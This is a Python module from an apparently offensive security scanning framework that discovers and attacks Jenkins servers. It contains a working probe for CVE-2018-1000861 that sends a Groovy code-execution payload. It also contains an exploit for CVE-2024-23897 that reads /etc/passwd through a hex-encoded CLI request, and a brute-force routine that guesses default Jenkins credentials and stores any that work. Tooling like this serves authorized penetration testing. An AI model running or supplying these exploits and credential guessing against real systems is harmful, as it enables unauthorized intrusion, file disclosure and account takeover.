import os.path

from utils.output import Output
from utils.db import DB
from utils.utils import gen_random_string, gen_bruteforce_creds
from lib.httpscan.http import HTTP
import uuid
import struct
import urllib
import sys
import time
import threading
import http.client as originalhttp

creds = [
    "admin:jenkins",
    "admin:admin",
    "jenkins:jenkins",
    "jenkins:admin",
    "jenkins:root",
    "root:root",
    "root:jenkins",
]

jenkins_urls = [
    '',
    'jenkins'
]


class Module:
    name = 'Jenkins'
    description = 'Discover and exploit Jenkins (bruteforce, CVE-2018-1000861, CVE-2024-23897)'

    def run(self, target, args, useragent, proxy, timeout, safe):
        http = HTTP(target['method'], target['hostname'], target['port'], useragent, proxy, timeout)

        Output.minor({'target': http.url(target['path']), 'message': '[%s] Running module...' % self.name})

        # Checking CVE-2018-1000861
        exploit_url = os.path.join(target['path'], 'securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript')
        payload = {
            'sandbox': 'true',
            'value': """public class x {
  public x(){
    "echo test".execute()
  }
}""",
        }
        res = http.get(exploit_url, params=payload)
        if res and res['code'] in [200] and 'jetty' in res['server'].lower():
            Output.vuln({'target': http.url(target['path']), 'message': '[%s] Jenkins RCE (CVE-2018-1000861)' % self.name})

            vuln_info = {
                'hostname': target['hostname'],
                'port': target['port'],
                'service': 'http',
                'url': http.url(target['path']),
                'name': 'Jenkins RCE (CVE-2018-1000861)',
                'description': 'Jenkins application %s is vulnerable to RCE (CVE-2018-1000861)' % http.url(target['path']),
            }
            DB.insert_vulnerability(vuln_info)

        # Checking CVE-2024-23897
        data_bytes = b'\x00\x00\x00\x0E\x00\x00\x0C\x63\x6F\x6E\x6E\x65\x63\x74\x2D\x6E\x6F\x64\x65\x00\x00\x00\x0E\x00\x00\x0C\x40\x2F\x65\x74\x63\x2F\x70\x61\x73\x73\x77\x64\x00\x00\x00\x07\x02\x00\x05\x55\x54\x46\x2D\x38\x00\x00\x00\x07\x01\x00\x05\x66\x72\x5F\x46\x52\x00\x00\x00\x00\x03'
        trgt = urllib.parse.urlparse(http.url(target['path']))
        uuid_str = str(uuid.uuid4())

        def req1():
            conn = originalhttp.HTTPConnection(trgt.netloc)
            conn.request("POST", "/cli?remoting=false", headers={
                "Session": uuid_str,
                "Side": "download"
            })
            out = conn.getresponse().read()
            if b"root:" in out:
                Output.vuln({'target': http.url(target['path']), 'message': '[%s] Jenkins Local File Read (CVE-2024-23897)' % self.name})
                vuln_info = {
                    'hostname': target['hostname'],
                    'port': target['port'],
                    'service': 'http',
                    'url': http.url(target['path']),
                    'name': 'Jenkins RCE (CVE-2024-23897)',
                    'description': 'Jenkins application %s is vulnerable to Local File Read (CVE-2024-23897)' % http.url(target['path']),
                }
                DB.insert_vulnerability(vuln_info)
                #If you want to the the output file
                #print(out)

        def req2():
            time.sleep(0.3)
            conn = originalhttp.HTTPConnection(trgt.netloc)
            conn.request("POST", "/cli?remoting=false", headers={
                "Session": uuid_str,
                "Side": "upload",
                "Content-type": "application/octet-stream"
            }, body=data_bytes)

        t1 = threading.Thread(target=req1)
        t2 = threading.Thread(target=req2)
        t1.start()
        t2.start()
        t1.join()
        t2.join()

        for url in jenkins_urls:
            url = os.path.join(target['path'], url)

            res = http.get(url)

            if res and res['code'] in [200,403] and ('jenkins' in res['title'].lower() and not '/jenkins' in res['title'].lower() or 'X-Jenkins' in res['headers']):
                http_info = {
                    'hostname': target['hostname'],
                    'port': target['port'],
                    'protocol': 'tcp',
                    'service': 'http',
                    'url': http.url(url),
                    'http': {
                        'path': url,
                        'code': res['code'],
                        'server': res['server'],
                        'title': res['title'],
                        'content-type': res['content-type'],
                    },
                    'tags': ['jenkins']
                }
                DB.insert_http_url(http_info)

                res['message_type'] = 'http'
                res['target'] = http.url(url)
                Output.write(res)

                if 'X-Jenkins' in res['headers']:
                    version = res['headers']['X-jenkins']
                else:
                    version = 'Unknown'

                Output.highlight({'target': http.url(url), 'message': '[%s] Jenkins application, version %s' % (self.name, version)})

                manage_url = os.path.join(url, 'manage')
                login_url = os.path.join(url, 'login')

                data = http.get(manage_url)

                if data['code'] in [200] and not "content='1;url=%s" % login_url in data['html']:
                    Output.vuln({'target': http.url(url), 'message': '[%s] Jenkins application accessible without authentication' % self.name})

                    vuln_info = {
                        'hostname': target['hostname'],
                        'port': target['port'],
                        'service': 'http',
                        'url': http.url(url),
                        'name': 'Anonymous Jenkins access',
                        'description': 'Jenkins application %s is accessible without authentication' % http.url(url),
                    }
                    DB.insert_vulnerability(vuln_info)
                else:
                    if args['bruteforce']:
                        Output.highlight({'target': http.url(login_url), 'message': '[%s] Starting bruteforce...' % self.name})
                        for cred in gen_bruteforce_creds(args['bruteforce'], creds):
                            username, password = cred.split(':')

                            data = http.get(login_url)

                            if not data:
                                continue

                            form = None
                            for f in data['forms']:
                                if not 'name' in f:
                                    continue

                                if 'login' in f['name'].lower():
                                    form = f
                                    break

                            if not form:
                                continue

                            for arg in form['args']:
                                if 'username' in arg.lower():
                                    form['args'][arg] = username

                                if 'password' in arg.lower():
                                    form['args'][arg] = password

                            res = http.send_form(login_url, form, html=data['html'], cookies=data['cookies'])

                            after_auth_form = None
                            for f in res['forms']:
                                if not 'name' in f:
                                    continue

                                if 'login' in f['name'].lower():
                                    after_auth_form = f
                                    break

                            if after_auth_form != None:
                                continue

                            Output.success({'target': http.url(url), 'message': '[%s] Authentication success to Jenkins with login %s and password %s' % (self.name, username, password)})

                            cred_info = {
                                'hostname': target['hostname'],
                                'port': target['port'],
                                'service': 'http',
                                'url': http.url(url),
                                'type': 'password',
                                'username': username,
                                'password': password,
                                'tags': ['jenkins'],
                            }
                            DB.insert_credential(cred_info)

                            vuln_info = {
                                'hostname': target['hostname'],
                                'port': target['port'],
                                'service': 'http',
                                'url': http.url(url),
                                'name': 'Default or predictable credentials on Jenkins service',
                                'description': 'Jenkins %s possess the following default or weak credentials: %s:%s' % (http.url(url), username, password),
                            }
                            DB.insert_vulnerability(vuln_info)


